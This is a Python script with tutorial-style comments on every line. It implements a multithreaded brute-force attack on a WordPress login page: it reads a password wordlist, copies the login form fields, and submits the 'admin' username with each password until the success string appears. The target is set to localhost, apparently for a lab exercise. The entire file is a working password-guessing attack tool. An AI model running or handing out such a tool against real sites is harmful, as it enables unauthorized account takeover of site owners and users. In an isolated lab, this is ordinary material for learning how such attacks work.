from io import BytesIO                                          # Allows to treat bytes in memory like a file. 
                                                                # Here HTML response content comes in as bytes, and lxml is given a file-like object built from those bytes.
from lxml import etree                                          # Used for parsing HTML/XML and walking through elements.
from queue import Queue                                         # Handles synchronization internally, so several threads can safely
                                                                # add items with put() and remove items with get() at the same time.

import requests                                                 # To make HTTP requests like GET and POST.
import threading                                                # Lets us create multiple threads that run concurrently. 
import time                                                     # To pause each worker thread for 5 seconds between attempts.

SUCCESS = 'Welcome to WordPress!'                               # Our code later checks whether this string appears in a response body. If it does, the code treats that as success.
TARGET = "http://localhost:8080/wp-login.php"
WORDLIST = "/home/kali/Downloads/cain-and-abel.txt" 


# Loads words from the wordlist file into a queue.
def get_words():
    with open(WORDLIST) as f:                                   # Opens our wordlist.
        raw_words = f.read()                                    # Reads the entire file into one string, 
                                                                # so raw_words now contains all file contents.
    
    words = Queue()                                             # Creates a new thread-safe queue.

    for word in raw_words.split():                              # Loops through each resulting token, 
                                                                # splitting the file text into separate words using whitespace. 
                                                                # `word` is each individual token in return. 
        words.put(word)                                         # Adds each word into the queue. put() inserts an item into a Queue.
    return words                                                # Returns the queue object, giving us a queue filled with words from the wordlist. 



# Extracts HTML form input fields into a Python dictionary.
def get_params(content):                                        # content is HTML response content in bytes.
    params = dict()                                             # Creates an empty dictionary. This will store key-value pairs extracted from HTML input elements.
    parser = etree.HTMLParser()                                 # Creates an HTML parser object from lxml. This parser is meant to parse HTML content.
    tree = etree.parse(BytesIO(content), parser=parser)         # Wraps `content` bytes in a `BytesIO` object so it behaves like a file. `tree` becomes the parsed HTML document.
    # Loops through all <input> elements in the parsed HTML:
    for elem in tree.findall('//input'):                        # Finds all input elements.
        name = elem.get('name')                                 # Reads the name attribute from the current input element: <input name="log" ...> name becomes "log".
        if name is not None:                                    # Checks that the input actually has a `name` attribute. If there is no `name`, it skips that element.
            params[name] = elem.get('value', None)              # Uses the input’s `name` as the dictionary key, and the input’s `value` attribute as the dictionary value. 
                                                                # If there is no `value`, it stores `None`. 
    return params                                               # Returns the completed dictionary. 


# Creating objects
class Bruter:
    '''
    # __init__ is a constructor — this runs automatically when we create an object here: `b = Bruter('admin', TARGET)`.
    # Python creates an instance of the class, and automatically calls: __init__(self, username, url).
    '''
    def __init__(self, username, url):                          # self = the object being created.                  
        self.username = username                                # Saves the passed-in `username` onto the object, so it becomes an instance attribute. If you pass `admin`, it becomes `self.username == admin`.
        self.url = url                                          # If you passed `TARGET` here: `b = Bruter('admin', TARGET)`, then: `self.url == "http://localhost:8080/wp-login.php"
        self.found = False                                      # This Object flag starts as False and becomes True once a match is found. It belongs to the object(Bruter), so all methods of the same object can access it.
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print(f'\nFinished the setup where Username = {username}.\n')
        # print("Finished the setup where username = %s\n" % username) — Old string formatting. 
    
    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()
    
    def web_bruter(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"\nBruteforcing successful.")
                print("Username is %s" % self.username)
                print("Password is %s\n" % passwd)
                print('done: now cleaning up other threads...')

if __name__ == '__main__':
    words = get_words()
    b = Bruter('admin', TARGET)
    b.run_bruteforce(words)
